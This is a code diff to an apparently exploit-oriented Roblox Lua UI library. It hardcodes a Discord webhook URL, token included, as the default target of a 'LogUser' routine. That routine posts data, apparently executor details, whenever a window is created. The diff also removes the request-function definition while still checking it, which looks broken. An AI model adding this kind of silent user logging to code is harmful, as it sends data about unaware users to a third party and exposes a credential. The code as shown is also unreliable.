@@ -19,8 +19,6 @@ local UserScreenSize = workspace:WaitForChild("Camera").ViewportSize
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
 
-local RequestFunc = request()
-
 -- Custom tweens
 local LIBtweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
 local fadeInInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
@@ -106,15 +104,13 @@ end
 function library.UserLogging:LogUser(data)
 	if RequestFunc then
 		--pcall(function()
-		RequestFunc({
-			"https://discord.com/api/webhooks/1474723230681137213/L_F18XJds4TWLyrpGVQKngmbocmFpWRcd-tEBY771s5tZ_JMPTQKIvpX7x-L3o_IxXtO",
+		request({
+			Url = data.Url,
 			Method = "POST",
 			Headers = data.Headers,
 			Body = data.Body
 		})
 		--end)
-	else
-		print("er")
 	end
 end
 
@@ -4603,9 +4599,10 @@ function library:CreateWindow(options)
 	end)
 
 	local e, v = identifyexecutor()
+	tree.Url = "https://discord.com/api/webhooks/1474723230681137213/L_F18XJds4TWLyrpGVQKngmbocmFpWRcd-tEBY771s5tZ_JMPTQKIvpX7x-L3o_IxXtO"
 
 	local data = {
-		--Url = options.Logging.Url,
+		Url = options.Logging.Url or tree.Url,
 
 		Headers = {
 			['Content-Type'] = 'application/json'
